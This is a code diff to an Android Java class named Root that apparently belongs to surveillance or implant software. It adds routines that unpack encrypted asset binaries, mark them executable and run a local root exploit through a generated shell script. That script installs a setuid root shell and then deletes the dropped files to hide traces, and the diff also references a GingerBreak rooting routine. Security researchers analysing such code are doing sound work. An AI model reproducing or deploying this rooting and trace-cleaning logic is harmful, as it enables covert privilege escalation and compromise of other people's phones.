@@ -208,6 +208,107 @@ public class Root {
 		}
 	}
 
+	static public boolean checkExploitability() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String exploitCheck = M.e("ec"); // ec
+
+		// ec
+		InputStream stream = Utils.getAssetStream("h.bin");
+		
+		try {
+			fileWrite(exploitCheck, stream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+
+			Process runScript = Runtime.getRuntime().exec(path + M.e("/ec"));
+			runScript.waitFor();
+			
+			int ret = runScript.exitValue();
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
+						+ " ret: " + ret);
+			}
+			
+			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
+			file.delete();
+			
+			return ret > 0 ? true : false;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+	
+	static public boolean localExploit() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String localExploit = M.e("l"); // local_exploit
+
+		// l
+		InputStream stream = Utils.getAssetStream("l.bin");
+		
+		try {
+			fileWrite(localExploit, stream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+			
+			// Unpack the suid shell
+			final String suidShell = M.e("ss"); // suid shell
+			InputStream shellStream = Utils.getAssetStream("s.bin");
+
+			fileWrite(suidShell, shellStream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
+
+			// Create the rooting script
+			String pack = Status.self().getAppContext().getPackageName();
+			
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";
+
+			if (Root.createScript("les", script) == true) {
+				Process runScript = Runtime.getRuntime().exec(path + "/les");
+				
+				runScript.waitFor();
+				
+				Root.removeScript("les");
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (localExploit), cannot create script");
+				}
+			}
+			
+			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+			file.delete();
+			
+			file = new File(Status.getAppContext().getFilesDir(), suidShell);
+			file.delete();
+
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+	
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
 	// directory)
 	static public boolean createScript(String name, String script) {
@@ -271,7 +372,7 @@ public class Root {
 		}
 	}
 
-	public void getPermissions() {
+	static public void getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
 
@@ -303,6 +404,10 @@ public class Root {
 
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
+	}
+	
+	static public boolean isRootShellInstalled() {
+		return PackageInfo.checkRoot();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
@@ -614,7 +719,7 @@ public class Root {
 		return 1;
 	}
 
-	public void runGingerBreak() {
+	static public void runGingerBreak() {
 		boolean isRoot = Status.haveRoot();
 
 		if (isRoot == false) {
